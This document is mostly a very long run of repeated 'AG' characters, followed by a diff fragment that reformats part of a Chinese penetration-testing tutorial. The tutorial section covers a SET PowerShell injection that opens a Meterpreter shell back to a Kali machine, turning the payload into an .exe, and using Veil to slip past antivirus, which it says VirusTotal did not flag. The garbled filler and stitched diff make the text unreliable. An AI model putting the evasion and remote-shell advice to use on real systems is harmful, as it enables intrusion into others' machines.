AGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGAGag
+
 Microsoft Windows [Version 6.1.7601] Copyright (C) 2009 Microsoft Corporation. All rights reserved. C:\Windows\System32\cmd.exe
+```
 
 如果 Windows 系统运行该代码，将会会话连接到你的 Kali 机器。
 
@@ -3021,26 +3129,25 @@ Microsoft Windows [Version 6.1.7601] Copyright (C) 2009 Microsoft Corporation. A
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_131_0.png)
 
-与之前的教程一样，一旦会话打开，我们可以使用任何 Meterpreter 或 Linux 命令，或者只需输入 "shell" 来获取远程命令行提示符。
+与之前的教程一样，一旦会话打开，我们可以使用任何 Meterpreter 或 Linux 命令，或者只需输入`shell`来获取远程命令行提示符。
 
-# 替代选项：
+# 替代选项
 
 虽然大多数用户不会将文本文件复制并粘贴到命令行提示符并执行它，但对于可能获得远程命令行提示符并想要使用完整 Meterpreter shell 的渗透测试人员来说，这种方法非常好。
 
-此外，网络上还有几个教程说明如何将生成的 SET PowerShell 文本文件转换为可执行的 .exe 文件。
+此外，网络上还有几个教程说明如何将生成的 SET PowerShell 文本文件转换为可执行的`.exe`文件。
 
-基本上，你将文本文件转换为批处理文件，然后使用 .bat 到 .exe 转换器将文件更改为执行文件。
+基本上，你将文本文件转换为批处理文件，然后使用`.bat`到`.exe`转换器将文件更改为执行文件。
 
 我把这个练习留给读者。
 
-或者你也可以简单地使用程序 "Veil”（参考“使用 Veil 绕过 AV”章节），它的功能基本相同。
+或者你也可以简单地使用程序`Veil`（参考“使用 Veil 绕过 AV”章节），它的功能基本相同。
 
 ## 结论
 
 现在几乎每个 Windows 机器上都有 PowerShell，而且许多杀毒软件无法检测这类攻击，使得它们非常强大。如下所示，我将 PowerShell 注入代码上传到 VirusTotal，它没有检测到任何恶意：
 
 ![](img/ff9cd19afe449ae54278ee429e668a6f_132_0.png)
-
